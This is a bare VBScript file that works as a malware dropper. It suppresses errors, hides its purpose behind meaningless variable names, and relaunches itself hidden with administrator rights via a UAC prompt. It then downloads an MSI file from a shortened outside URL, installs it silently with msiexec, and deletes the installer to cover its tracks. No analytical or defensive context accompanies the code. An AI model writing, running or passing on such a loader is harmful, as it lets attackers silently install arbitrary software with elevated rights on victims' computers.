On Error Resume Next
Dim x1, x2, x3, x4, x5, x6, x7, x8, x9
x1 = "WScript.Shell"
x2 = CreateObject(x1).ExpandEnvironmentStrings("%TEMP%")
x3 = x2 & "\agent_installer.msi"
x4 = "https://search.app/gnR5H"

If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

x5 = "MSXML2.ServerXMLHTTP.6.0"
Set x6 = CreateObject(x5)
x6.open "GET", x4, False
x6.send()

If x6.Status >= 300 And x6.Status < 400 Then
    x4 = x6.getResponseHeader("Location")
    x6.open "GET", x4, False
    x6.send()
End If

If x6.Status = 200 Then
    Set x7 = CreateObject("ADODB.Stream")
    x7.Open
    x7.Type = 1
    x7.Write x6.ResponseBody
    x7.Position = 0
    x7.SaveToFile x3, 2
    x7.Close

    Set x8 = CreateObject(x1)
    x8.Run "msiexec /i """ & x3 & """ /quiet /qn /norestart", 0, True

    Set x9 = CreateObject("Scripting.FileSystemObject")
    If x9.FileExists(x3) Then x9.DeleteFile x3
End If
